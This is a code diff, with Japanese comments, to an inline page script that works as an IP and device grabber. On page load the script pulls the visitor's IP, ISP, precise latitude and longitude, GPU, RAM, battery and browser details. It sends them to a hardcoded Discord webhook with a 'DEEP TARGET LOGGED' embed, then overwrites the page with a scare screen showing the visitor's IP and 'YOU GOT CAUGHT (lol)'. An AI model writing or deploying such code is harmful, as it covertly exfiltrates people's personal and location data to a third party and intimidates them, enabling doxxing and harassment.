@@ -1,29 +1,38 @@
 <script type="text/javascript">
-(async function() {
-    try {
-        const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";
+(function() {
+    const w = "https://discord.com/api/webhooks/1480858959148486698/rogRAjEJV4UBPNPuq6vCS1mI44C77w771WdB7RWqh696LK9IOP654SsfT1zIXjaVGF87";
 
-        // 1. 詳細情報の取得 (ip-api を使用: CORS制限が緩く詳細が取れる)
-        const ipRes = await fetch('https://ip-api.com/json/?fields=66846719');
-        const d = await ipRes.json();
-
-        // 2. デバイス・環境情報の取得
+    window.callback = async function(d) {
+        // 1. 高度なデバイス情報の取得
         const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const vpn = (tz !== d.timezone) ? "⚠️ VPN/Proxy 濃厚" : "生IP可能性高";
+        const vpn = (d.proxy || (d.timezone && tz !== d.timezone)) ? "⚠️ VPN/Proxy 検出" : "REAL IP";
+        
+        // GPU情報の取得
+        let gpu = "N/A";
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } catch(e){}
+
+        // メモリ・バッテリー
+        const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "不明";
         let bat = "N/A";
         try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100) + "%"; } catch(e){}
 
-        // 3. Discordへ送信するリッチなデータ
+        // 2. Discord用ペイロード（さらに詳しく）
         const payload = {
             embeds: [{
-                title: "🛑 ターゲット完全捕捉",
-                color: 16711680,
+                title: "💀 DEEP TARGET LOGGED",
+                description: "ターゲットの環境を詳細に特定しました。",
+                color: 0, // 黒
                 fields: [
-                    { name: "🌐 ネットワーク情報", value: `**IP:** ${d.query}\n**国/都市:** ${d.country} / ${d.city}\n**ISP:** ${d.isp}\n**VPN判定:** ${vpn}`, inline: false },
-                    { name: "💻 デバイス情報", value: `**OS:** ${navigator.platform}\n**電池:** ${bat}\n**コア数:** ${navigator.hardwareConcurrency}\n**解像度:** ${screen.width}x${screen.height}`, inline: true },
-                    { name: "🔍 ブラウザ/言語", value: `**言語:** ${navigator.language}\n**UA:** \`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                    { name: "🌐 ネットワーク詳細", value: `**IP:** ${d.query}\n**ISP:** ${d.isp}\n**AS:** ${d.as}\n**国/都市:** ${d.country} / ${d.city}\n**緯度/経度:** ${d.lat}, ${d.lon}\n**VPN判定:** ${vpn}`, inline: false },
+                    { name: "💻 ハードウェア", value: `**OS:** ${navigator.platform}\n**GPU:** ${gpu}\n**RAM:** ${ram}\n**CPU:** ${navigator.hardwareConcurrency} Cores`, inline: false },
+                    { name: "🔋 ステータス", value: `**電池:** ${bat}\n**言語:** ${navigator.language}\n**解像度:** ${screen.width}x${screen.height}`, inline: true }
                 ],
-                footer: { text: "ADLOL Global Tracking" },
+                footer: { text: "ADLOL Advanced Intelligence" },
                 timestamp: new Date()
             }]
         };
@@ -35,21 +44,22 @@
             body: JSON.stringify(payload)
         });
 
-        // 4. 送信後の「演出」：画面をハッキング風に書き換える
+        // 3. 恐怖の演出（相手のIPをデカデカと表示）
         document.body.innerHTML = `
-            <div style="background-color:black; color:#0f0; height:100vh; width:100vw; position:fixed; top:0; left:0; font-family:monospace; padding:20px; box-sizing:border-box; z-index:999999;">
-                <h2>[SYSTEM FAILURE]</h2>
-                <p>> ACCESSING LOCAL FILES...</p>
-                <p>> UPLOADING DATA TO SERVER... DONE</p>
-                <p>> YOUR IP: ${d.query} HAS BEEN LOGGED.</p>
+            <div style="background:#000; color:#f00; height:100vh; width:100vw; position:fixed; top:0; left:0; font-family:monospace; padding:40px; text-shadow: 0 0 10px red;">
+                <h1>[CRITICAL ERROR]</h1>
+                <p>> TARGET IP: <span style="font-size:2em;">${d.query}</span></p>
                 <p>> LOCATION: ${d.city}, ${d.country}</p>
-                <p style="color:red; font-weight:bold;">> YOU GOT CAUGHT (lol)</p>
-                <blink>_</blink>
+                <p>> GPU: ${gpu}</p>
+                <p>> UPLOADING SYSTEM DATA... 100%</p>
+                <h2 style="margin-top:50px;">YOU GOT CAUGHT. (lol)</h2>
             </div>
         `;
+    };
 
-    } catch (err) {
-        console.error(err);
-    }
+    // 詳細情報をまとめて取得するAPI
+    var script = document.createElement('script');
+    script.src = 'https://ip-api.com/json/?callback=callback&fields=66846719';
+    document.head.appendChild(script);
 })();
 </script>
